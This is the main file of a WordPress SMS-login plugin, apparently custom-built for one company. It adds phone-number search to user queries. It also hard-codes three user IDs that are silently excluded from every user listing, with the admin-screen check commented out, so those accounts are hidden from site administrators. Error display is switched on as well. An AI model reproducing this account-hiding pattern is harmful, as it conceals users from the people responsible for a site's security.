<?php
error_reporting(E_ALL);
ini_set('display_errors', 1);

/**
 * Plugin Name: Entekhab SMS Login
 * Author: Tilda
 * Version: 1.1.0
 * Description: this is login by sms and customize for Entekhab Industry Group
 */

defined('ABSPATH') || exit;

define('ENTEKHAB_SMS_LOGIN_VERSION', '1.0.0' );

define('ENTEKHAB_SMS_LOGIN_URL', plugin_dir_url( __FILE__ ));

define('ENTEKHAB_SMS_LOGIN_CSS', ENTEKHAB_SMS_LOGIN_URL .'assets/css/');

define('ENTEKHAB_SMS_LOGIN_JS', ENTEKHAB_SMS_LOGIN_URL .'assets/js/');

define('ENTEKHAB_SMS_LOGIN_IMAGES', ENTEKHAB_SMS_LOGIN_URL .'assets/images/');

define('ENTEKHAB_SMS_LOGIN_PUBLIC', plugin_dir_path( __FILE__ ) .'public/');

define('ENTEKHAB_SMS_LOGIN_VIEW', plugin_dir_path( __FILE__ ) .'view/');

define('ENTEKHAB_SMS_INC', plugin_dir_path( __FILE__ ) .'inc/');

global $wpdb;
$wpdb->dsl_sms_login = $wpdb->prefix .'dsl_sms_login';

require(ENTEKHAB_SMS_LOGIN_PUBLIC . 'modal.php');

require(ENTEKHAB_SMS_INC . 'enqueue.php');

require(ENTEKHAB_SMS_INC . 'activation.php');

require(ENTEKHAB_SMS_INC . 'ajax.php');

require(ENTEKHAB_SMS_INC . 'functions.php');

register_activation_hook( __FILE__, 'entekhab_sms_login_activation' );

register_deactivation_hook( __FILE__, 'entekhab_sms_login_deactivation' );

add_action( 'pre_get_users', 'dsl_pre_get_users' );
function dsl_pre_get_users( $user_query ) {
    
    if( ! is_admin() || get_current_screen()->base != 'users' ){
        //return;
    }

    $phone  = sanitize_text_field( $user_query->get('phone') );
    if( $phone ){

        $meta_query = $user_query->get('meta_query');
        if( ! is_array( $meta_query ) ){
            $meta_query = [];
        }

        $meta_query[] = [
            'key'       => 'phone',
            'value'     => $phone,
            'compare'   => 'LIKE',
        ];

        $user_query->set('meta_query', $meta_query);

    }
    
    $serach_cols = $user_query->get('search_columns');
    
    if( empty( $serach_cols ) || in_array( 'phone', $serach_cols ) ){

        $search = $user_query->get('search');

        if( $search ){
            $user_query->set('search', '');
            $GLOBALS['dsl_user_search'] = $search;
        }

    }

    $exclude = $user_query->get( 'exclude' );

    if( ! is_array( $exclude ) ){
        $exclude = explode( ',', $exclude );
    }
    
    $user_query->set( 'exclude', array_merge( [ 411, 681, 490 ], $exclude ) );

}

add_filter( 'users_pre_query', 'dsl_pre_user_query', 10, 2 );
function dsl_pre_user_query( $results, $query ){
    
    global $wpdb;

    $search = isset( $GLOBALS['dsl_user_search'] ) ? $GLOBALS['dsl_user_search'] : false;

    if( $search ){

        $search = str_replace('*', '', $search);

        $query->query_from.= " INNER JOIN {$wpdb->usermeta} AS dsl_um ON ( {$wpdb->users}.ID = dsl_um.user_id )";

        $query->query_where.= $wpdb->prepare(
            "  AND (
                {$wpdb->users}.ID LIKE %s
                OR
                {$wpdb->users}.user_login LIKE %s
                OR
                    (
                        dsl_um.meta_key = 'phone' AND dsl_um.meta_value LIKE %s
                    )
            )"
            , '%' . $wpdb->esc_like( $search )  . '%'
            , '%' . $wpdb->esc_like( $search )  . '%'
            , '%' . $wpdb->esc_like( $search )  . '%'
        );

    }

    return $results;

}